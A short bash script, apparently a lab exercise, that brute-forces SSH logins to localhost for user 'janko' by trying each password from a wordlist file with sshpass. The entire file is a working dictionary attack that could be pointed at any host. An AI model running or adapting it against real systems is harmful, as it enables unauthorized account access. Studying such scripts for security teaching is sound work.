#!/usr/bin/env bash
LOGIN=janko
HOST=localhost
PASSWORD=jahodka
while read -r LINE; do
    printf "Trying password $LINE... "
    sshpass -p ${LINE} ssh ${LOGIN}@${HOST} echo "" 2> /dev/null 1>&2
    if [[ $? -gt 0 ]]; then
           echo "failed"
    else
           echo "passed"
           break
    fi
done < hesla.txt
echo "done"

